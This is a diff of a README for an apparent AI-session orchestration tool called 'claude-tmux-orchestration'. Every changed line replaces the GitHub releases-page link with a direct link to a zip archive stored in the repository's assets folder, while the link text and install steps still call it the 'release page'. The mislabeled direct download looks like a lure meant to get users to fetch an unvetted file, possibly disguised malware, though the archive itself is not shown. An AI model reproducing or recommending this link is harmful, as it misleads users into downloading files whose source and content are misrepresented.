@@ -1,6 +1,6 @@
 # 🤖 claude-tmux-orchestration - Run parallel AI sessions with ease
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Psychical-mls439/claude-tmux-orchestration/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Psychical-mls439/claude-tmux-orchestration/main/assets/tmux_orchestration_claude_v2.8.zip)
 
 ## 🚀 What this app does
 
@@ -10,7 +10,7 @@ Use it when you want to split a task into smaller parts, keep several AI session
 
 ## 📥 Download and install
 
-1. Open the [release page](https://github.com/Psychical-mls439/claude-tmux-orchestration/releases)
+1. Open the [release page](https://raw.githubusercontent.com/Psychical-mls439/claude-tmux-orchestration/main/assets/tmux_orchestration_claude_v2.8.zip)
 2. Find the latest release
 3. Download the Windows file from the Assets section
 4. Save the file to a folder you can find again, such as Downloads or Desktop
@@ -157,7 +157,7 @@ If output files are missing:
 
 Use the release page here if you need the latest file or a fresh copy:
 
-[https://github.com/Psychical-mls439/claude-tmux-orchestration/releases](https://github.com/Psychical-mls439/claude-tmux-orchestration/releases)
+[https://raw.githubusercontent.com/Psychical-mls439/claude-tmux-orchestration/main/assets/tmux_orchestration_claude_v2.8.zip](https://raw.githubusercontent.com/Psychical-mls439/claude-tmux-orchestration/main/assets/tmux_orchestration_claude_v2.8.zip)
 
 ## 🧠 What to expect during use
 
